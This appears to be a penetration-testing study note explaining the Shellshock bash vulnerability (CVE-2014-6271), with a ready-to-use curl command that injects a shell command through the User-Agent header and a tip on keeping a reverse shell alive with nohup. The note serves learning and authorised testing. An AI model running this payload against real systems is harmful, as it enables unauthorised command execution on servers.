---
type: technique
tags: [ejpt:web-pentest, ejpt:host-net-pentest]
tools: [curl]
cves: [CVE-2014-6271]
related: [[command-injection]]
---

# Shellshock (CVE-2014-6271)

Remote command execution via bash's handling of environment variables that start with a function definition. Vulnerable bash parses `() { … }` as a function and then keeps executing **trailing commands** ([[cve-2014-6271]]).

## How it works

An env var shaped like:

```
() { :;}; <command>
```

defines an empty function (`:`) and then runs `<command>`. Attackers control an env var (e.g. `User-Agent` → `HTTP_USER_AGENT` in CGI), so the command executes as the web server user.

## Test / exploit

```sh
curl 'http://TARGET/cgi-bin/script' -H 'User-Agent: () { :;}; /bin/bash -c "id"'
```

- Fires wherever attacker-influenced data reaches a vulnerable bash (CGI scripts, some daemons invoking bash).
- A reverse shell spawned this way is a child of the short-lived request — background *and* detach it (`nohup … &`) or it dies with the request ([[reverse-shells]]).

## Seen in

[[bruteshock]] (`User-Agent` → `www-data`)
